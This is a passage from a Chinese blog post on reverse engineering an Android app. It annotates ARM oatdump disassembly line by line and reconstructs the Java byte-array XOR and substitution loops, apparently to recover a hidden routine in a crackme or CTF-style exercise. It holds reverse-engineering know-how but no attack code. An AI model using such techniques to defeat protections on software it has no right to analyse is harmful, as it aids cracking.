r0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f88: f0808242    bcs.w   +1156 (0x00372410)  // 对s2数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f8c: f80c6005    strb    r6, [r12, r5]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f90: 68b9        ldr     r1, [r7, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f92: f117020c    adds    r2, r7, #12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f96: 428d        cmp     r5, r1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f98: f080823f    bcs.w   +1150 (0x0037241a)  // 对s2数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f9c: 5756        ldrsb   r6, [r2, r5]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f9e: 9b0d        ldr     r3, [sp, #52]       // 取出s6数组的mirror::Array对象的首地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fa0: f8d3c008    ldr.w   r12, [r3, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fa4: f113000c    adds    r0, r3, #12         // 取出s6数组的mirror::Array对象中数据区域的首地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fa8: 4565        cmp     r5, r12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371faa: f080823a    bcs.w   +1140 (0x00372422)  // 对s6数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fae: f9108005    UNKNOWN 17                  // ldrsb.w    r8, [r0, r5]，也就是r8 = s6[r5]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fb2: 68ba        ldr     r2, [r7, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fb4: ea860608    eor.w   r6, r6, r8          // r6 = (s2[r5] + 54) ^ s6[r5]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fb8: f3460607    UNKNOWN 52                  // SBFX.W    R6, R6, #0, #8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fbc: f117010c    adds    r1, r7, #12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fc0: 4295        cmp     r5, r2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fc2: f0808233    bcs.w   +1126 (0x0037242c)  // 对s2数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fc6: 554e        strb    r6, [r1, r5]        // s2[r5] = (s2[r5] + 54) ^ s6[r5]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fc8: 1c6d        adds    r5, r5, #1          // r5 += 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fca: 3c01        subs    r4, #1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fcc: f47fafc9    bne.w   -110 (0x00371f62)   // 循环，这里跳回去&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以看到，上面汇编代码里含有大量的边界判断的跳转，这些应该是系统自动添加的一些处理，我们可以忽略掉。另外需要我们对mirror::Array类型有一定的了解。汇编代码中出现的UNKNOWN部分，应该是oatdump没有识别出这些指令，我们可以利用ida识别出来。这段对应的Java源码为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for (int i = 0; i &amp;lt; s2.length; ++i) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    s2[i] = (byte) ((s2[i] + 54) ^ s6[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;继续下一段：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x00371fd2: 2500        movs    r5, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fd4: f8da6008    ldr.w   r6, [r10, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fd8: 42b5        cmp     r5, r6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fda: f2808051    bge.w   +162 (0x00372080)   // 这里就是一个for循环&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fde: f8da3008    ldr.w   r3, [r10, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fe2: f11a0c0c    adds    r12, r10, #12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fe6: 429d        cmp     r5, r3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fe8: f0808229    bcs.w   +1106 (0x0037243e)  // 对s1数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371fec: f91c6005    UNKNOWN 17                  // ldrsb.w r6, [r12, r5]，也就是r6 = s1[r5]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371ff0: f04f0857    mov.w   r8, #87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371ff4: 4546        cmp     r6, r8              // s1[r5]和87比较&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371ff6: f0408009    bne.w   +18 (0x0037200c)    // 如果不等则跳向0x0037200c，等于则跳向0x00371ffa&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371ffa: f8da1008    ldr.w   r1, [r10, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371ffe: 2669        movs    r6, #105            // r6 = 105&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372000: f11a000c    adds    r0, r10, #12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372004: 428d        cmp     r5, r1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372006: f080821f    bcs.w   +1086 (0x00372448)  // 对s1数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037200a: 5546        strb    r6, [r0, r5]        // s1[r5] = 105&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037200c: f8da2008    ldr.w   r2, [r10, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372010: f11a030c    adds    r3, r10, #12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372014: 4295        cmp     r5, r2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372016: f080821b    bcs.w   +1078 (0x00372450)  // 对s1数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037201a: 575e        ldrsb   r6, [r3, r5]        // r6 = s1[r5]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037201c: f04f0832    mov.w   r8, #50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372020: 4546        cmp     r6, r8              // s1[r5]和50比较&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372022: f040800b    bne.w   +22 (0x0037203c)    // 如果不等则跳向0x0037203c，等于则跳向0x00372026&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372026: f8da0008    ldr.w   r0, [r10, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037202a: f06f067b    mvn     r6, #123            // r6 = ~123&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037202e: f11a0c0c    adds    r12, r10, #12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372032: 4285        cmp     r5, r0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372034: f0808211    bcs.w   +1058 (0x0037245a)  // 对s1数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372038: f80c6005    strb    r6, [r12, r5]       // s1[r5] = ~123&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037203c: f8da1008    ldr.w   r1, [r10, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372040: f11a020c    adds    r2, r10, #12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372044: 428d        cmp     r5, r1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372046: f080820d    bcs.w   +1050 (0x00372464)  // 对s1数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037204a: 5756        ldrsb   r6, [r2, r5]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037204c: f8db3008    ldr.w   r3, [r11, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372050: f11b0c0c    adds    r12, r11, #12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372054: 429d        cmp     r5, r3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372056: f0808209    bcs.w   +1042 (0x0037246c)  // 对s5数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037205a: f91c8005    UNKNOWN 17                  // ldrsb.w r8, [r12, r5]，也就是r8 = s5[r5]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037205e: f8da1008    ldr.w   r1, [r10, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372062: ea860608    eor.w   r6, r6, r8          // r6 = s1[r5] ^ s5[r5]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372066: f3460607    UNKNOWN 52                  // SBFX.W    R6, R6, #0, #8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037206a: f11a000c    adds    r0, r10, #12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037206e: 428d        cmp     r5, r1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372070: f0808201    bcs.w   +1026 (0x00372476)  // 对s1数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372074: 5546        strb    r6, [r0, r5]        // s1[r5] = s1[r5] ^ s5[r5]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372076: 1c6d        adds    r5, r5, #1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372078: 3c01        subs    r4, #1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037207a: f47fafab    bne.w   -170 (0x00371fd4)   // 循环，这里跳回去&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这段对应的Java源码为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for (int i = 0; i &amp;lt; s1.length; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (s1[i] == 87) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        s1[i] = 105;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (s1[i] == 50) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        s1[i] = ~(123);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    s1[i] = (byte) (s1[i] ^ s5[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;继续下一段：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x00372080: f8da6008    ldr.w   r6, [r10, #8]   // r6 = s1.length&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372084: f8d9e11c    ldr.w   lr, [r9, #284]  ; pAllocArrayResolved&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372088: f8d78008    ldr.w   r8, [r7, #8]    // r8 = s2.length&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037208c: 9900        ldr     r1, [sp, #0]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037208e: eb160608    adds.w  r6, r6, r8      // r6 = s1.length + s2.length&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372092: 1c32        mov     r2, r6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372094: f64e0020    movw    r0, #59424&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372098: f2c7005b    movt    r0, #28763&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037209c: 47f0        blx     lr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;对应的Java源码为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;byte[] d1 = new byte[s1.length + s2.length];    // [sp, #40]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;继续下一段：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x0037209e: f8da2008    ldr.w   r2, [r10, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720a2: 900a        str     r0, [sp, #40]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720a4: 2600        movs    r6, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720a6: 9800        ldr     r0, [sp, #0]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720a8: f04f0800    mov.w   r8, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720ac: 9216        str     r2, [sp, #88]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720ae: 9a16        ldr     r2, [sp, #88]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720b0: f8cd8010    str.w   r8, [sp, #16]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720b4: 68c0        ldr     r0, [r0, #12]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720b6: f24f0cd8    movw    r12, #61656&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720ba: f850000c    ldr.w   r0, [r0, r12]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720be: 9205        str     r2, [sp, #20]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720c0: f8d0e028    ldr.w   lr, [r0, #40]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720c4: 9b0a        ldr     r3, [sp, #40]   // r3为d1数组对象&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720c6: 4651        mov     r1, r10         // r1为s1数组对象&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720c8: 1c32        mov     r2, r6          // r2 = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720ca: 47f0        blx     lr              // 这是执行什么函数？&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里最后的跳转，lr的值是无法计算出来的。最开始我尝试对获取lr的过程进行分析，但是这里取值的过程绕了多次，因此放弃了这种方法。我们在整个文件中搜索&lt;code&gt;#61656&lt;/code&gt;，找到下面一段代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;3: java.lang.Object[] android.support.v4.content.FileProvider.copyOf(java.lang.Object[], int) (dex_method_idx=2961)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  DEX CODE:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x0000: const/4 v1, #+0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x0001: new-array v0, v3, java.lang.Object[] // type@2035&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x0003: invoke-static &amp;#123;v2, v1, v0, v1, v3&amp;#125;, void java.lang.System.arraycopy(java.lang.Object, int, java.lang.Object, int, int) // method@15411&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b14: 1c05        mov     r5, r0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b16: 1c38        mov     r0, r7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b18: 68c0        ldr     r0, [r0, #12]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b1a: 2200        movs    r2, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b1c: 9204        str     r2, [sp, #16]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b1e: f24f0cd8    movw    r12, #61656&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b22: f850000c    ldr.w   r0, [r0, r12]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b26: 9605        str     r6, [sp, 